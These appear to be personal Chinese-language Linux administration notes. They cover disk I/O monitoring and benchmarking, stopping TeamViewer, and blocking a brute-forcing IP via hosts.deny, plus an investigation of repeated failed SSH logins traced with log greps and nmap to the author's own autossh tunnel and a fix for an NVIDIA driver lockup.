10:16:47 PM       sde      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00

await：平均每次设备 I/O 操作的等待时间   
svctm：平均每次设备 I/O 操作的服务时间
%util：一秒中有百分之几的时间用于 I/O 操作
如果 svctm 的值与 await 很接近，表示几乎没有 I/O 等待，磁盘性能很好。
如果 await 的值远高于 svctm 的值，则表示 I/O 队列等待太长，系统上运行的应用程序将变慢，此时可以通过更换更快的硬盘来解决问题。

查看一天前的报告；可以查看保存在 /var/log/sa/ 下的sar日志
$ sar -d -p -f /var/log/sa/sa11 | less


(3) iostat 命令
$ vmstat 2
procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd       free    buff     cache   si   so    bi    bo   in   cs us sy id  wa st
 1  0  20480 126338464 10333024 247614096    0    0    18    29    0    1  9 13 78  0  0
 1  0  20480 126338976 10333024 247614096    0    0     0    10 1101 1087  0  0 100  0  0
 1  0  20480 126338976 10333024 247614096    0    0     0     0 1014 1009  0  0 100  0  0
 2  0  20480 126338976 10333024 247614096    0    0     0     8  969 1272  0  0 100  0  0
 0  0  20480 126338976 10333024 247614096    0    0     0     0 1034 1281  0  0 100  0  0
 0  0  20480 126338976 10333024 247614096    0    0     0     2 1397 1534  0  0 100  0  0
 0  0  20480 126338464 10333024 247614096    0    0     0   102  886  860  0  0 100  0  0
 1  0  20480 126338464 10333024 247614096    0    0     0     0 1159 1666  0  0 100  0  0
...
bi  块设备每秒接收的块数量，这里的块设备是指系统上所有的磁盘和其他块设备，默认块大小是 1024 byte 。

bo 块设备每秒发送的块数量，例如我们读取文件，bo 就要大于0。bi 和 bo 一般都要接近 0，不然就是 IO 过于频繁，需要调整




2. 测试磁盘 IO 性能

(1) hdparm 命令
hdparm 命令提供了一个命令行的接口用于读取和设置IDE或SCSI硬盘参数，注意该命令只能测试磁盘的读取速率

$ sudo hdparm -Tt /dev/sda
/dev/sda:
 Timing cached reads:   18906 MB in  1.99 seconds = 9506.90 MB/sec
 Timing buffered disk reads: 1264 MB in  3.00 seconds = 420.88 MB/sec

$ sudo hdparm -Tt /dev/sdb
/dev/sdb:
 Timing cached reads:   18632 MB in  1.99 seconds = 9369.39 MB/sec
 Timing buffered disk reads: 242 MB in  3.02 seconds =  80.19 MB/sec

从测试结果看出，带有缓存的读取速率为：9369.39MB/s ，磁盘的实际读取速率为：80.19 MB/s

符合实际情况，因为 /dev/sdb 是一个亚健康的 RAID ，6块盘坏了1块。


(2) dd 命令
==> 测试写性能命令： 此命令为在当前目录下新建一个2G的文件
$ time dd if=/dev/zero of=test.file bs=1G count=2 oflag=direct
2+0 records in
2+0 records out
2147483648 bytes (2.1 GB) copied, 2.92284 s, 735 MB/s

real	0m3.050s
user	0m0.004s
sys	0m1.092s

该分区磁盘写入速率为 735M/s


==> 测试读性能命令：
$ dd if=test.file of=/dev/null iflag=direct
4194304+0 records in
4194304+0 records out
2147483648 bytes (2.1 GB) copied, 414.91 s, 5.2 MB/s

读取速度极慢， 5.2M/s



/dev/zero 伪设备，会产生空字符流，对它不会产生 IO 。
if 参数用来指定 dd 命令读取的文件。
of 参数用来指定 dd 命令写入的文件。
bs 参数代表每次写入的块的大小。
count 参数用来指定写入的块的个数。
offlag=direc 参数测试 IO 时必须指定，代表直接写如磁盘，不使用 cache



(3) fio 命令







ref:
https://www.jianshu.com/p/c74036594e54?ivk_sa=1024320u






========================================
关掉 teamviewer 进程
----------------------------------------
1. 找到
$ ps -aux | grep team
root      6366  1.3  0.0 1792432 14148 ?       Sl   20:47   0:00 /opt/teamviewer/tv_bin/teamviewerd -d
wangjl    6423  0.0  0.0  13144  1056 pts/22   S+   20:47   0:00 grep --color=auto team


2. 关掉
使用 kill -9 6366 不行，杀掉一个又开一个。
/opt/teamviewer/tv_bin/teamviewerd -d

$ sudo service teamviewerd stop



3. 防止再启动
$ sudo mv /opt/teamviewer/tv_bin/teamviewerd /opt/teamviewer/tv_bin/teamviewerd-backup

$ sudo service teamviewerd start
Job for teamviewerd.service failed because the control process exited with error code.
See "systemctl status teamviewerd.service" and "journalctl -xe" for details.




========================================
怎么禁止反复尝试root密码登录的IP
----------------------------------------
1. 193 server
$ sudo cat /var/log/secure  | grep -i "fail" | grep "root" | wc
   5187   69170  578802

$ sudo cat /var/log/secure  | grep -i "fail" | grep "root" | head -n 2500|tail
Sep 20 03:00:40 bio_svr1 sshd[330083]: Failed password for root from 172.18.18.161 port 57020 ssh2
Sep 20 03:01:04 bio_svr1 unix_chkpwd[330128]: password check failed for user (root)
Sep 20 03:01:04 bio_svr1 sshd[330125]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.18.18.161  user=root
Sep 20 03:01:06 bio_svr1 sshd[330125]: Failed password for root from 172.18.18.161 port 59068 ssh2
Sep 20 03:01:30 bio_svr1 unix_chkpwd[330153]: password check failed for user (root)
Sep 20 03:01:30 bio_svr1 sshd[330151]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.18.18.161  user=root
Sep 20 03:01:31 bio_svr1 sshd[330151]: Failed password for root from 172.18.18.161 port 32884 ssh2
Sep 20 03:01:55 bio_svr1 unix_chkpwd[330178]: password check failed for user (root)
Sep 20 03:01:55 bio_svr1 sshd[330176]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.18.18.161  user=root
Sep 20 03:01:58 bio_svr1 sshd[330176]: Failed password for root from 172.18.18.161 port 34932 ssh2


$ sudo cat /var/log/secure  | grep -i "fail" | grep "root" | tail
Sep 21 01:23:21 bio_svr1 sshd[190555]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.16.29.106  user=root
Sep 21 01:23:23 bio_svr1 sshd[190555]: Failed password for root from 10.16.29.106 port 52076 ssh2
Sep 21 01:23:42 bio_svr1 unix_chkpwd[190579]: password check failed for user (root)
Sep 21 01:23:42 bio_svr1 sshd[190576]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.16.29.106  user=root
Sep 21 01:23:44 bio_svr1 sshd[190576]: Failed password for root from 10.16.29.106 port 58898 ssh2
Sep 21 03:17:33 bio_svr1 unix_chkpwd[197918]: password check failed for user (root)
Sep 21 03:17:33 bio_svr1 sshd[197916]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.16.29.106  user=root
Sep 21 03:17:35 bio_svr1 sshd[197916]: Failed password for root from 10.16.29.106 port 45864 ssh2
Sep 21 11:28:15 bio_svr1 unix_chkpwd[200415]: password check failed for user (root)
Sep 21 11:28:15 bio_svr1 su: pam_unix(su:auth): authentication failure; logname=zhouwg uid=1027 euid=0 tty=pts/64 ruser=zhouwg rhost=  user=root


尝试破解root的地址:
$ sudo cat /var/log/secure  | grep  "fail" | grep "root" | grep "rhost" | awk '{print $14}' | sort | uniq -c
      1 rhost=
     13 rhost=10.16.12.105
     21 rhost=10.16.15.219
      8 rhost=10.16.29.106
     15 rhost=10.16.29.144
   1670 rhost=172.18.18.161

末尾添加一句，禁止从该IP登录
$ sudo vim /etc/hosts.deny
sshd:172.18.18.161:deny

不允许从该IP登录









2. 2024 年初 攻击历史记录

登录记录
	CentOS: /var/log/secure
	Ubuntu: /var/log/auth.log

(1) 10 server 已经停止攻击
[wangjl@JinLab ~]$ sudo cat /var/log/secure  | grep "Failed"
Feb 18 03:14:58 JinLab sshd[27978]: Failed password for wangjl from 10.20.89.188 port 44766 ssh2
Feb 18 03:14:58 JinLab sshd[27978]: Failed password for wangjl from 10.20.89.188 port 44766 ssh2
Feb 18 03:24:58 JinLab sshd[28568]: Failed password for wangjl from 10.20.89.188 port 44768 ssh2
Feb 18 03:24:58 JinLab sshd[28568]: Failed password for wangjl from 10.20.89.188 port 44768 ssh2
Feb 18 03:34:58 JinLab sshd[29156]: Failed password for wangjl from 10.20.89.188 port 44770 ssh2
... 共 86 条，还在继续攻击测试。
Feb 18 09:45:04 JinLab sshd[19660]: Failed password for wangjl from 10.20.89.188 port 44844 ssh2
Feb 18 09:55:04 JinLab sshd[20251]: Failed password for wangjl from 10.20.89.188 port 44846 ssh2
Feb 18 09:55:04 JinLab sshd[20251]: Failed password for wangjl from 10.20.89.188 port 44846 ssh2
Feb 18 10:05:04 JinLab sshd[20871]: Failed password for wangjl from 10.20.89.188 port 44848 ssh2
Feb 18 10:05:04 JinLab sshd[20871]: Failed password for wangjl from 10.20.89.188 port 44848 ssh

目前还在测试我的密码。
	怎么直到我的用户名的？ //todo

这个IP在哪里？
	- 局域网

$ w
 10:35:01 up 218 days, 23:48,  3 users,  load average: 0.18, 0.06, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
hcy      pts/2    10.20.89.188     Fri16   45.00s  0.09s  0.09s -bash
xfwang   pts/4    10.12.53.79      10:24   37.00s  0.42s  0.27s sshd: xfwang [priv] 
wangjl   pts/3    10.20.14.80      10:08    5.00s  0.16s  0.04s w
貌似是 hcy 这个用户的登录地址。

哪些端口开放？
	$ sudo nmap -sS -p 0-10000 10.20.89.188
	[sudo] password for wangjl: 
	Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-18 10:22 CST
	Nmap scan report for 10.20.89.188
	Host is up (0.00034s latency).
	Not shown: 9993 closed ports
	PORT     STATE SERVICE
	22/tcp   open  ssh
	53/tcp   open  domain
	80/tcp   open  http
	7000/tcp open  afs3-fileserver
	8000/tcp open  http-alt
	8080/tcp open  http-proxy
	8787/tcp open  msgsrvr
	9000/tcp open  cslistener

这一看就是我自己的工作站路由器。
	反思：也就是说我用VB开了一个虚拟机，密码比较简单，被攻克了？
	登录查了一下，没啥异常，先 power off




(2) 我的 Y station
wangjl@YStation:~$ sudo cat /var/log/auth.log > logs.txt
wangjl@YStation:~$ cat logs.txt | grep "Failed"
Feb 18 00:02:12 YStation sshd[788037]: Failed password for wangjl from 192.168.2.1 port 52226 ssh2
Feb 18 00:02:12 YStation sshd[788037]: Failed password for wangjl from 192.168.2.1 port 52226 ssh2
Feb 18 00:12:12 YStation sshd[789191]: Failed password for wangjl from 192.168.2.1 port 56114 ssh2
Feb 18 00:12:12 YStation sshd[789191]: Failed password for wangjl from 192.168.2.1 port 56114 ssh2
...
Feb 18 10:42:21 YStation sshd[863583]: Failed password for wangjl from 192.168.2.1 port 43290 ssh2
Feb 18 10:52:21 YStation sshd[864859]: Failed password for wangjl from 192.168.2.1 port 47116 ssh2
Feb 18 10:52:21 YStation sshd[864859]: Failed password for wangjl from 192.168.2.1 port 47116 ssh2
Feb 18 11:02:21 YStation sshd[867211]: Failed password for wangjl from 192.168.2.1 port 50864 ssh2
Feb 18 11:02:21 YStation sshd[867211]: Failed password for wangjl from 192.168.2.1 port 50864 ssh2

现在是 11:17，可见 11:12 没有测，难道是那个时间我把虚拟机关闭了？不是，仅仅是因为该数据来自我的文件，而不是实时记录。
更新为实时记录 
$ sudo cat /var/log/auth.log | grep "Failed" | tail
Feb 18 11:12:21 YStation sshd[868516]: Failed password for wangjl from 192.168.2.1 port 54736 ssh2
Feb 18 11:12:21 YStation sshd[868516]: Failed password for wangjl from 192.168.2.1 port 54736 ssh2
Feb 18 11:22:21 YStation sshd[869961]: Failed password for wangjl from 192.168.2.1 port 58524 ssh2
Feb 18 11:22:21 YStation sshd[869961]: Failed password for wangjl from 192.168.2.1 port 58524 ssh2

这个提示攻击来自于路由器？ 192.168.2.1 
	可能：斐讯路由器 劫持 https://zhuanlan.zhihu.com/p/51273981

查看攻击来源的开放端口：
	wangjl@YStation:~$ sudo nmap -sS -p 0-10000 192.168.2.1
	Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-18 11:13 CST
	Nmap scan report for phicomm.me (192.168.2.1)
	Host is up (0.00037s latency).
	Not shown: 9997 closed ports
	PORT     STATE SERVICE
	53/tcp   open  domain
	80/tcp   open  http
	5000/tcp open  upnp
	8080/tcp open  http-proxy
	MAC Address: 74:7D:24:95:6C:F3 (Phicomm (Shanghai))

	Nmap done: 1 IP address (1 host up) scanned in 401.49 seconds

	意外收获：留下一个 5000 端口可用


来自于路由器的攻击，怎么防？
	最后发现是 J 上运行的 autossh 命令：
	[wangjl@JinLab ~]$ ps -aux | grep autossh
	wangjl    7230  0.0  0.0 112812   980 pts/4    S+   14:56   0:00 grep --color=auto autossh
	wangjl   12129  0.0  0.0   6516   788 ?        S    Feb14   0:00 autossh -M 8889 -Ng -L 8888:192.168.2.105:22 wangjl@y.biomooc.com
	[wangjl@JinLab ~]$ kill -9 12129
	[wangjl@JinLab ~]$ ps -aux | grep autossh
	wangjl    7375  0.0  0.0 112812   980 pts/4    S+   14:58   0:00 grep --color=auto autossh
	
	再回到Y查，没有连接记录了：
	$ sudo cat /var/log/auth.log | grep "Failed" | tail -n 2
	Feb 18 14:52:24 YStation sshd[895916]: Failed password for wangjl from 192.168.2.1 port 54298 ssh2
	Feb 18 14:52:24 YStation sshd[895916]: Failed password for wangjl from 192.168.2.1 port 54298 ssh2
	wangjl@YStation:~$ date
	Sun 18 Feb 2024 03:04:43 PM CST

	说明对该路由器所在局域网的访问，都有经过该路由器。








========================================
更新显卡驱动后，开机CPU异常 (显卡设置见 Linux/Linux101-sys-disk.txt)
----------------------------------------

1. 之前重装了显卡驱动，需要重启就一直拖着。
风机太响，前几天挂机了，今天重启后异常：
异常信息直接在shell和htop弹出
Message from syslogd@YStation at Dec  3 11:20:58 ...
 kernel:[  667.889298] watchdog: BUG: soft lockup - CPU#3 stuck for 23s! [nvidia-smi:9143]

Message from syslogd@YStation at Dec  3 11:21:10 ...
 kernel:[  679.881362] watchdog: BUG: soft lockup - CPU#1 stuck for 23s! [gnome-session-c:8130]



2. 其实是卸载 全部驱动

卸载旧版本nvidia驱动：
$ sudo apt-get remove --purge nvidia*

$ which nvidia-smi
$

$ sudo reboot 
正常了。




========================================
----------------------------------------





========================================
----------------------------------------



========================================
----------------------------------------



========================================
----------------------------------------





========================================
----------------------------------------



========================================
----------------------------------------



========================================
----------------------------------------





========================================
----------------------------------------



========================================
----------------------------------------



========================================
----------------------------------------





========================================
----------------------------------------



========================================
----------------------------------------



========================================
----------------------------------------





========================================
----------------------------------------



========================================
----------------------------------------



========================================
----------------------------------------

